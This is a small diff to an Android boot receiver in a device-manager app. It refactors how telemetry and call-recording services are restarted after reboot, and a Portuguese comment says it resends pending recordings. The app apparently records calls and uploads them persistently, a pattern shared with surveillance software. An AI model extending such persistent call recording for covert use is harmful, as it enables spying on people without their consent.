@@ -3,7 +3,6 @@ package com.company.devicemgr.receivers;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.os.Build;
 
 import com.company.devicemgr.services.CallRecordingService;
 import com.company.devicemgr.services.ForegroundTelemetryService;
@@ -29,17 +28,13 @@ public class BootReceiver extends BroadcastReceiver {
                 boolean started = sp.getBoolean("service_started", false);
                 if (started) {
                     Intent svc = new Intent(context, ForegroundTelemetryService.class);
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        context.startForegroundService(svc);
-                    } else {
-                        context.startService(svc);
-                    }
+                    AppRuntime.startServiceCompat(context, svc, true);
                 }
             }
 
             // tenta enviar gravações pendentes após reinício
             try {
-                context.startService(new Intent(context, CallRecordingService.class));
+                AppRuntime.startServiceCompat(context, new Intent(context, CallRecordingService.class), true);
             } catch (Exception ignored) {
             }
         }
